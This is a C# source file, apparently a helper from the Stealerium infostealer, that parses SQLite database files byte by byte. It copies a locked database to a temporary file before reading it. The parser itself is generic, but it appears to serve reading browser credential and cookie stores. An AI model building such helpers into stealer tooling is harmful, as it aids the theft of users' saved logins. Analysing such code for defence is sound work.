using System;
using System.IO;
using System.Text;

namespace Stealerium.Helpers;

public class SqLite
{
	private struct RecordHeaderField
	{
		public long Size;

		public long Type;
	}

	private struct TableEntry
	{
		public string[] Content;
	}

	private struct SqliteMasterEntry
	{
		public string ItemName;

		public long RootNum;

		public string SqlStatement;
	}

	private readonly ulong _dbEncoding;

	private readonly byte[] _fileBytes;

	private readonly ulong _pageSize;

	private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

	private string[] _fieldNames;

	private SqliteMasterEntry[] _masterTableEntries;

	private TableEntry[] _tableEntries;

	public SqLite(string fileName)
	{
		_fileBytes = File.ReadAllBytes(fileName);
		_pageSize = ConvertToULong(16, 2);
		_dbEncoding = ConvertToULong(56, 4);
		ReadMasterTable(100L);
	}

	public string GetValue(int rowNum, int field)
	{
		try
		{
			if (rowNum >= _tableEntries.Length)
			{
				return null;
			}
			return (field >= _tableEntries[rowNum].Content.Length) ? null : _tableEntries[rowNum].Content[field];
		}
		catch
		{
			return "";
		}
	}

	public int GetRowCount()
	{
		return _tableEntries.Length;
	}

	private bool ReadTableFromOffset(ulong offset)
	{
		try
		{
			switch (_fileBytes[offset])
			{
			case 13:
			{
				uint num4 = (uint)(ConvertToULong((int)offset + 3, 2) - 1L);
				int num5 = 0;
				if (_tableEntries != null)
				{
					num5 = _tableEntries.Length;
					Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num4 + 1);
				}
				else
				{
					_tableEntries = new TableEntry[num4 + 1];
				}
				for (uint num6 = 0u; (int)num6 <= (int)num4; num6++)
				{
					ulong num7 = ConvertToULong((int)offset + 8 + (int)(num6 * 2), 2);
					if (offset != 100L)
					{
						num7 += offset;
					}
					int num8 = Gvl((int)num7);
					Cvl((int)num7, num8);
					int num9 = Gvl((int)((long)num7 + ((long)num8 - (long)num7) + 1L));
					Cvl((int)((long)num7 + ((long)num8 - (long)num7) + 1L), num9);
					ulong num10 = num7 + (ulong)((long)num9 - (long)num7 + 1L);
					int num11 = Gvl((int)num10);
					int num12 = num11;
					long num13 = Cvl((int)num10, num11);
					RecordHeaderField[] array = null;
					long num14 = (long)num10 - (long)num11 + 1L;
					int num15 = 0;
					while (num14 < num13)
					{
						Array.Resize(ref array, num15 + 1);
						int num16 = num12 + 1;
						num12 = Gvl(num16);
						array[num15].Type = Cvl(num16, num12);
						array[num15].Size = ((array[num15].Type <= 9L) ? _sqlDataTypeSize[array[num15].Type] : ((!IsOdd(array[num15].Type)) ? ((array[num15].Type - 12L) / 2L) : ((array[num15].Type - 13L) / 2L)));
						num14 = num14 + (num12 - num16) + 1L;
						num15++;
					}
					if (array == null)
					{
						continue;
					}
					_tableEntries[num5 + (int)num6].Content = new string[array.Length];
					int num17 = 0;
					for (int i = 0; i <= array.Length - 1; i++)
					{
						if (array[i].Type > 9L)
						{
							if (!IsOdd(array[i].Type))
							{
								long dbEncoding = (long)_dbEncoding;
								long num18 = dbEncoding - 1L;
								if ((ulong)num18 <= 2uL)
								{
									switch (num18)
									{
									case 0L:
										_tableEntries[num5 + (int)num6].Content[i] = Encoding.Default.GetString(_fileBytes, (int)((long)num10 + num13 + num17), (int)array[i].Size);
										break;
									case 1L:
										_tableEntries[num5 + (int)num6].Content[i] = Encoding.Unicode.GetString(_fileBytes, (int)((long)num10 + num13 + num17), (int)array[i].Size);
										break;
									case 2L:
										_tableEntries[num5 + (int)num6].Content[i] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num10 + num13 + num17), (int)array[i].Size);
										break;
									}
								}
							}
							else
							{
								_tableEntries[num5 + (int)num6].Content[i] = Encoding.Default.GetString(_fileBytes, (int)((long)num10 + num13 + num17), (int)array[i].Size);
							}
						}
						else
						{
							_tableEntries[num5 + (int)num6].Content[i] = Convert.ToString(ConvertToULong((int)((long)num10 + num13 + num17), (int)array[i].Size));
						}
						num17 += (int)array[i].Size;
					}
				}
				break;
			}
			case 5:
			{
				uint num = (uint)(ConvertToULong((int)(offset + 3L), 2) - 1L);
				for (uint num2 = 0u; (int)num2 <= (int)num; num2++)
				{
					uint num3 = (uint)ConvertToULong((int)offset + 12 + (int)(num2 * 2), 2);
					ReadTableFromOffset((ConvertToULong((int)(offset + num3), 4) - 1L) * _pageSize);
				}
				ReadTableFromOffset((ConvertToULong((int)(offset + 8L), 4) - 1L) * _pageSize);
				break;
			}
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	private void ReadMasterTable(long offset)
	{
		while (true)
		{
			switch (_fileBytes[offset])
			{
			case 5:
			{
				uint num13 = (uint)(ConvertToULong((int)offset + 3, 2) - 1L);
				for (int j = 0; j <= (int)num13; j++)
				{
					uint num14 = (uint)ConvertToULong((int)offset + 12 + j * 2, 2);
					if (offset == 100L)
					{
						ReadMasterTable((long)((ConvertToULong((int)num14, 4) - 1L) * _pageSize));
					}
					else
					{
						ReadMasterTable((long)((ConvertToULong((int)(offset + num14), 4) - 1L) * _pageSize));
					}
				}
				break;
			}
			default:
				return;
			case 13:
			{
				ulong num = ConvertToULong((int)offset + 3, 2) - 1L;
				int num2 = 0;
				if (_masterTableEntries != null)
				{
					num2 = _masterTableEntries.Length;
					Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num + 1);
				}
				else
				{
					checked
					{
						_masterTableEntries = new SqliteMasterEntry[(ulong)unchecked((long)(num + 1L))];
					}
				}
				for (ulong num3 = 0uL; num3 <= num; num3++)
				{
					ulong num4 = ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
					if (offset != 100L)
					{
						num4 += (ulong)offset;
					}
					int num5 = Gvl((int)num4);
					Cvl((int)num4, num5);
					int num6 = Gvl((int)((long)num4 + ((long)num5 - (long)num4) + 1L));
					Cvl((int)((long)num4 + ((long)num5 - (long)num4) + 1L), num6);
					ulong num7 = num4 + (ulong)((long)num6 - (long)num4 + 1L);
					int num8 = Gvl((int)num7);
					int num9 = num8;
					long num10 = Cvl((int)num7, num8);
					long[] array = new long[5];
					for (int i = 0; i <= 4; i++)
					{
						int startIdx = num9 + 1;
						num9 = Gvl(startIdx);
						array[i] = Cvl(startIdx, num9);
						array[i] = ((array[i] <= 9L) ? _sqlDataTypeSize[array[i]] : ((!IsOdd(array[i])) ? ((array[i] - 12L) / 2L) : ((array[i] - 13L) / 2L)));
					}
					long dbEncoding;
					if (_dbEncoding == 1L || _dbEncoding == 2L)
					{
						dbEncoding = (long)_dbEncoding;
						long num11 = dbEncoding - 1L;
						if ((ulong)num11 <= 2uL)
						{
							switch (num11)
							{
							case 0L:
								_masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(_fileBytes, (int)((long)num7 + num10 + array[0]), (int)array[1]);
								break;
							case 1L:
								_masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)((long)num7 + num10 + array[0]), (int)array[1]);
								break;
							case 2L:
								_masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num7 + num10 + array[0]), (int)array[1]);
								break;
							}
						}
					}
					_masterTableEntries[num2 + (int)num3].RootNum = (long)ConvertToULong((int)((long)num7 + num10 + array[0] + array[1] + array[2]), (int)array[3]);
					dbEncoding = (long)_dbEncoding;
					long num12 = dbEncoding - 1L;
					if ((ulong)num12 <= 2uL)
					{
						switch (num12)
						{
						case 0L:
							_masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)((long)num7 + num10 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
							break;
						case 1L:
							_masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)((long)num7 + num10 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
							break;
						case 2L:
							_masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num7 + num10 + array[0] + array[1] + array[2] + array[3]), (int)array[4]);
							break;
						}
					}
				}
				return;
			}
			}
			offset = (long)((ConvertToULong((int)offset + 8, 4) - 1L) * _pageSize);
		}
	}

	public bool ReadTable(string tableName)
	{
		int num = -1;
		for (int i = 0; i <= _masterTableEntries.Length; i++)
		{
			if (string.Compare(_masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
			{
				num = i;
				break;
			}
		}
		if (num == -1)
		{
			return false;
		}
		string[] array = _masterTableEntries[num].SqlStatement.Substring(_masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[1] { ',' });
		for (int j = 0; j <= array.Length - 1; j++)
		{
			array[j] = array[j].TrimStart(Array.Empty<char>());
			int num2 = array[j].IndexOf(' ');
			if (num2 > 0)
			{
				array[j] = array[j].Substring(0, num2);
			}
			if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
			{
				Array.Resize(ref _fieldNames, j + 1);
				_fieldNames[j] = array[j];
			}
		}
		return ReadTableFromOffset((ulong)(_masterTableEntries[num].RootNum - 1L) * _pageSize);
	}

	private ulong ConvertToULong(int startIndex, int size)
	{
		try
		{
			if (size > 8 || size == 0)
			{
				return 0uL;
			}
			ulong num = 0uL;
			for (int i = 0; i <= size - 1; i++)
			{
				num = (num << 8) | _fileBytes[startIndex + i];
			}
			return num;
		}
		catch
		{
			return 0uL;
		}
	}

	private int Gvl(int startIdx)
	{
		try
		{
			if (startIdx > _fileBytes.Length)
			{
				return 0;
			}
			int num = startIdx;
			while (true)
			{
				if (num <= startIdx + 8)
				{
					if (num <= _fileBytes.Length - 1)
					{
						if ((_fileBytes[num] & 0x80) != 128)
						{
							break;
						}
						num++;
						continue;
					}
					return 0;
				}
				return startIdx + 8;
			}
			return num;
		}
		catch
		{
			return 0;
		}
	}

	private long Cvl(int startIdx, int endIdx)
	{
		try
		{
			endIdx++;
			byte[] array = new byte[8];
			int num = endIdx - startIdx;
			bool flag = false;
			if (num == 0 || num > 9)
			{
				return 0L;
			}
			if (num != 1)
			{
				if (num == 9)
				{
					flag = true;
				}
				int num2 = 1;
				int num3 = 7;
				int num4 = 0;
				if (flag)
				{
					array[0] = _fileBytes[endIdx - 1];
					endIdx--;
					num4 = 1;
				}
				for (int i = endIdx - 1; i >= startIdx; i += -1)
				{
					if (i - 1 >= startIdx)
					{
						array[num4] = (byte)(((_fileBytes[i] >> num2 - 1) & (255 >> num2)) | (_fileBytes[i - 1] << num3));
						num2++;
						num4++;
						num3--;
					}
					else if (!flag)
					{
						array[num4] = (byte)((_fileBytes[i] >> num2 - 1) & (255 >> num2));
					}
				}
				return BitConverter.ToInt64(array, 0);
			}
			array[0] = (byte)(_fileBytes[startIdx] & 0x7Fu);
			return BitConverter.ToInt64(array, 0);
		}
		catch
		{
			return 0L;
		}
	}

	private static bool IsOdd(long value)
	{
		return (value & 1L) == 1L;
	}

	public static SqLite ReadTable(string database, string table)
	{
		if (!File.Exists(database))
		{
			return null;
		}
		string text = Path.GetTempFileName() + ".tmpdb";
		File.Copy(database, text);
		SqLite sqLite = new SqLite(text);
		sqLite.ReadTable(table);
		File.Delete(text);
		if (sqLite.GetRowCount() != 65536)
		{
			return sqLite;
		}
		return null;
	}
}
